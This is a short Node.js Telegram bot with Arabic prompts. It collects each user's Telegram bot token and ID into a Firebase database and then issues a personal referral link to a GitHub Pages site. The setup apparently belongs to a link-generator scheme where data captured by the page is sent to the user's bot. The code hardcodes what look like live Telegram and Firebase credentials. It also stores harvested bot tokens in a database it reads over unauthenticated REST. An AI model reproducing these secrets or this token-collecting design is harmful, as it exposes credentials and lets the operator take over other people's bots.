import { Telegraf, Markup } from 'telegraf';
import fetch from 'node-fetch';
import { initializeApp } from 'firebase/app';
import { getDatabase, ref, set } from 'firebase/database';
import http from 'http';

const firebaseConfig = {
  apiKey: "AIzaSyCCEvGjvP8gw12mFYnxV_XPOHhM_zHJB_U",
  authDomain: "migad-9aa39.firebaseapp.com",
  databaseURL: "https://migad-9aa39-default-rtdb.firebaseio.com",
  projectId: "migad-9aa39",
  storageBucket: "migad-9aa39.appspot.com",
  messagingSenderId: "82386152423",
  appId: "1:82386152423:web:fb466405bbc8c12d2beb42",
  measurementId: "G-2LCCDX0159"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

const bot = new Telegraf('8146975499:AAHbKH8x3I_iRTbGSpCp2xfCnS2xDnDjNK0');

bot.start(async (ctx) => {
  const chatId = ctx.chat.id;
  const firstName = ctx.from.first_name || "مستخدم";
  
  ctx.reply(`👋 أهلاً ${firstName}!\nأرسل التوكن الخاص ببوتك الآن:`);
  await set(ref(database, 'users/' + chatId), {
    step: 'waiting_token',
    name: firstName
  });
});

bot.on('text', async (ctx) => {
  const chatId = ctx.chat.id;
  const userRef = ref(database, 'users/' + chatId);
  const res = await fetch(`${firebaseConfig.databaseURL}/users/${chatId}.json`);
  const user = await res.json();
  const text = ctx.message.text;
  
  if (!user || user.step === 'waiting_token') {
    if (!text.includes(':')) {
      return ctx.reply('⚠️ التوكن غير صحيح، تأكد أنه يحتوي على ":"');
    }
    
    await set(userRef, {
      ...user,
      token: text,
      step: 'waiting_id'
    });
    return ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
  }
  
  if (user.step === 'waiting_id') {
    if (!/^\d{5,}$/.test(text)) {
      return ctx.reply('⚠️ ID غير صالح. تأكد أنه يحتوي على أرقام فقط.');
    }
    
    await set(userRef, {
      ...user,
      id: text,
      step: 'done'
    });
    
    const refLink = `https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`;
    
    return ctx.reply(`✅ تم الحفظ بنجاح!\n\n🔗 رابطك الخاص:\n${refLink}`, Markup.inlineKeyboard([
      [Markup.button.url("فتح الرابط", refLink)]
    ]));
  }
  
  return ctx.reply('✅ بياناتك محفوظة مسبقًا. يمكنك استخدام الرابط الخاص بك.');
});

bot.launch();
console.log('🤖 البوت يعمل الآن!');

// فتح سيرفر وهمي لـ Render
http.createServer(() => {}).listen(process.env.PORT || 3000);